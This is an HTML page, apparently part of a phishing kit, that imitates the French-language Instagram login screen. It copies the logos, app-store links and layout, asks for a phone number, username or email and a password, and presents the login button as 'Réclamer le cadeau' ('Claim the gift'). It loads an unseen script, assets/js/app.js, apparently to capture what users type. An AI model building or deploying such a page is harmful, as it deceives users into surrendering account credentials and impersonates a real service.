<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/css/main.css">
    <script src="assets/js/app.js"></script>
    <title>Instagram</title>
</head>
<body>
<main class="l-main">
    <div class="l-main__img">
        <img src="assets/img/homepage.png" alt="Smartphones">
    </div>
    <div class="l-user">
        <div class="c-panel group">
            <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
            <div class="c-panel__form">
                <input type="text" id="username" class="c-panel__input" placeholder="Num. de téléphone, pseudo, email">
                <input type="password" id="password" class="c-panel__input" placeholder="Mot de passe">
                <a href="https://www.instagram.com/" class="c-btn" id="login-button">Réclamer le cadeau</a>
                <span class="c-panel__span">OU</span>
            </div>
            <a href="#" class="c-panel__facebook">Se connecter avec Facebook</a>
            <a href="#" class="c-panel__forgot">Mot de passe oublié ?</a>
        </div>
        <div class="c-signup group">
            <p>Vous n'avez pas de compte ? <span>S'inscrire</span></p>
        </div>
        <div class="c-app">
            <p>Obtenir l'application.</p>
            <div class="c-app__download" style="display: flex; align-items: center; justify-content: center;">
                <a href="https://apps.apple.com/fr/app/instagram/id389801252" style="margin-right: 10px;">
                    <img src="assets/img/apple.png" alt="Apple Store">
                </a>
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=fr&gl=US&pli=1">
                    <img src="assets/img/google.png" alt="Google Play">
                </a>
            </div>
        </div>
    </div>
</main>
</body>
</html>
